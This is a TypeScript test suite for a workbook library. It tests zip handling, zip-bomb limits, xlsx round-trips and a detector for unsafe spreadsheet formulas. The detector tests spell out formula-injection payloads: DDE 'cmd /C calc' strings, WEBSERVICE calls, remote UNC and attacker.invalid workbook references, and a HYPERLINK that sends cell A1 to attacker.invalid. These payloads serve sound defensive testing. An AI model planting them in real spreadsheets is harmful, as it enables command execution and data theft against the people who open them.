import { describe, expect, test } from "bun:test";

import {
  buildZip,
  cellInputFromText,
  excelSerialToIso,
  renderSheetTable,
  unsafeFormulaReason,
  listZipEntries,
  openXlsxWorkbook,
  readZipEntryData,
  sheetGridRows,
  utf8Bytes,
  utf8Text,
  writeXlsxWorkbook,
} from "../src/index.ts";

function patchUint32(bytes: Uint8Array, offset: number, value: number): void {
  new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength).setUint32(offset, value, true);
}

describe("@openwork/workbook", () => {
  test("zips and unzips through the Web Streams compression API without Node buffers", async () => {
    const text = Array.from({ length: 4_000 }, (_line, index) => `row ${index},${(index * 7919) % 1000},${(index * 104_729) % 97}`).join("\n");
    const archive = await buildZip([
      { name: "a.txt", data: utf8Bytes(text) },
      { name: "dir/b.bin", data: new Uint8Array([1, 2, 3, 250, 251, 252]) },
    ]);
    expect(archive).toBeInstanceOf(Uint8Array);
    const entries = listZipEntries(archive);
    expect(entries.map((entry) => [entry.name, entry.method])).toEqual([["a.txt", 8], ["dir/b.bin", 0]]);
    expect(entries[0].compressedSize).toBeLessThan(entries[0].uncompressedSize);
    expect(utf8Text(await readZipEntryData(archive, entries[0]))).toBe(text);
    expect([...await readZipEntryData(archive, entries[1])]).toEqual([1, 2, 3, 250, 251, 252]);
  });

  test("stores an entry that would compress past the reader's ratio bound", async () => {
    const archive = await buildZip([{ name: "flat.txt", data: utf8Bytes("A".repeat(200_000)) }]);
    const [entry] = listZipEntries(archive);
    expect(entry.method).toBe(0);
    expect(entry.compressedSize).toBe(entry.uncompressedSize);
    expect(utf8Text(await readZipEntryData(archive, entry))).toBe("A".repeat(200_000));
  });

  test("keeps multi-line text, refuses over-long text, and avoids Excel's reserved sheet name", async () => {
    const { bytes, sheets } = await writeXlsxWorkbook([
      { name: "History", header: false, rows: [["line one\nline two", " keep edges "]] },
    ]);
    expect(sheets.map((sheet) => sheet.name)).toEqual(["History-2"]);
    const workbook = await openXlsxWorkbook(bytes);
    const sheet = await workbook.readSheet(workbook.sheets[0]);
    expect(sheet.cells.map((cell) => cell.displayedValue)).toEqual(["line one\nline two", "keep edges"]);
    expect(renderSheetTable(sheet).text).toContain("| 1 | line one line two | keep edges |");
    await expect(writeXlsxWorkbook([{ rows: [["x".repeat(32_768)]] }])).rejects.toThrow("Excel allows 32767");
  });

  test("reports sheets beyond the read limit instead of hiding them", async () => {
    const declared = Array.from({ length: 70 }, (_sheet, index) => `<sheet name="S${index + 1}" sheetId="${index + 1}"/>`).join("");
    const archive = await buildZip([
      { name: "xl/workbook.xml", data: utf8Bytes(`<workbook><sheets>${declared}</sheets></workbook>`) },
      { name: "xl/worksheets/sheet1.xml", data: utf8Bytes('<worksheet><sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData></worksheet>') },
    ]);
    const workbook = await openXlsxWorkbook(archive);
    expect(workbook.sheets).toHaveLength(64);
    expect(workbook.omittedSheets).toBe(6);
  });

  test("renders serials as dates, datetimes, or times of day", () => {
    expect(excelSerialToIso(45000)).toBe("2023-03-15");
    expect(excelSerialToIso(45000.5)).toBe("2023-03-15 12:00:00");
    expect(excelSerialToIso(0.75)).toBe("18:00:00");
    expect(excelSerialToIso(0)).toBe("00:00:00");
    expect(excelSerialToIso(1)).toBe("1900-01-01");
  });

  test("stops inflating an entry as soon as it exceeds the size its directory declares", async () => {
    const archive = await buildZip([{ name: "bomb.xml", data: utf8Bytes(Array.from({ length: 3_000 }, (_line, index) => `<c r="A${index}"><v>${(index * 7919) % 100_003}</v></c>`).join("")) }]);
    const [entry] = listZipEntries(archive);
    const understated = 100;
    const view = new DataView(archive.buffer, archive.byteOffset, archive.byteLength);
    const centralOffset = view.getUint32(archive.byteLength - 22 + 16, true);
    patchUint32(archive, entry.localOffset + 22, understated);
    patchUint32(archive, centralOffset + 24, understated);
    const [patched] = listZipEntries(archive);
    expect(patched.uncompressedSize).toBe(understated);
    await expect(readZipEntryData(archive, patched)).rejects.toThrow("inflated beyond its declared size");
  });

  test("round-trips a workbook and exposes a dense editable grid anchored at A1", async () => {
    const { bytes, sheets } = await writeXlsxWorkbook([
      { name: "Data", header: false, rows: [[], ["", "B2", 3], ["", "", "", true]] },
    ]);
    expect(sheets).toEqual([{ name: "Data", rows: 3, columns: 4 }]);
    const workbook = await openXlsxWorkbook(bytes);
    const sheet = await workbook.readSheet(workbook.sheets[0]);
    expect(sheet.cells.map((cell) => cell.reference)).toEqual(["B2", "C2", "D3"]);
    expect(sheetGridRows(sheet)).toEqual([
      ["", "", "", ""],
      ["", "B2", "3", ""],
      ["", "", "", "TRUE"],
    ]);
    expect(() => sheetGridRows(sheet, { maxCells: 5 })).toThrow("too large to show as an editable grid");
  });

  test("names why a formula would reach outside the workbook", () => {
    expect(unsafeFormulaReason("SUM(A1:A9)")).toBeNull();
    expect(unsafeFormulaReason("=IF(B2>0, HYPERLINK(\"https://example.com\", \"source\"), \"\")")).toBeNull();
    expect(unsafeFormulaReason("Table1[Amount]*2")).toBeNull();
    expect(unsafeFormulaReason("Sheet2!A1+1")).toBeNull();
    expect(unsafeFormulaReason("webservice(\"http://x\")")).toBe("uses WEBSERVICE, which reaches outside the workbook when it recalculates");
    expect(unsafeFormulaReason("FILTERXML(WEBSERVICE(\"http://x\"),\"//a\")")).toContain("FILTERXML");
    expect(unsafeFormulaReason("cmd|' /C calc'!A0")).toBe("contains a DDE-style external command reference");
    expect(unsafeFormulaReason('DDE("cmd","/c calc","!A0")')).toBe("uses DDE, which reaches outside the workbook when it recalculates");
    expect(unsafeFormulaReason('SQL.REQUEST("DSN=x","","",1)')).toContain("SQL.REQUEST");
    expect(unsafeFormulaReason("[1]Sheet1!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("'C:\\evil\\[Book1.xlsx]Sheet1'!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("[Book1]Sheet1!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("[Book.xlsx]シート1!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("[Book.xlsx]Übersicht_2!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("[Book] Sheet!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("'[Book1]Sheet 1'!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("'\\\\attacker\\share\\[book]Sheet1'!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("'http://attacker.invalid/[book]Sheet1'!A1")).toBe("references another workbook");
    expect(unsafeFormulaReason("'\\\\attacker\\share\\book'!A1")).toBe("references a remote or network path");
    expect(unsafeFormulaReason("'https://attacker.invalid/book'!A1")).toBe("references a remote or network path");
    expect(unsafeFormulaReason("Table1[Amount]+Sheet2!A1")).toBeNull();
    expect(unsafeFormulaReason("SUM(Table1[[#Headers],[Amount]])")).toBeNull();
    expect(unsafeFormulaReason("[@Amount]*2")).toBeNull();
    expect(unsafeFormulaReason("'My Sheet'!A1+'Q3 Data'!B2")).toBeNull();
    expect(unsafeFormulaReason("")).toBe("is empty");
    expect(unsafeFormulaReason("A".repeat(9000))).toBe("is longer than 8192 characters");
  });

  test("turns edited text back into typed cells conservatively", () => {
    expect(cellInputFromText("")).toBeNull();
    expect(cellInputFromText("1742.42")).toBe(1742.42);
    expect(cellInputFromText("-3")).toBe(-3);
    expect(cellInputFromText("1e3")).toBe(1000);
    expect(cellInputFromText("TRUE")).toBe(true);
    expect(cellInputFromText("FALSE")).toBe(false);
    expect(cellInputFromText("=SUM(A1:A3)")).toBe("=SUM(A1:A3)");
    expect(cellInputFromText('=HYPERLINK("https://attacker.invalid/?v="&A1,"view")')).toBe('=HYPERLINK("https://attacker.invalid/?v="&A1,"view")');
    expect(cellInputFromText("=cmd|' /C calc'!A0")).toBe("=cmd|' /C calc'!A0");
    expect(cellInputFromText("=")).toBe("=");
    expect(cellInputFromText("02134")).toBe("02134");
    expect(cellInputFromText("1,000")).toBe("1,000");
    expect(cellInputFromText(" 7")).toBe(" 7");
    expect(cellInputFromText("true")).toBe("true");
    expect(cellInputFromText("Infinity")).toBe("Infinity");
  });
});
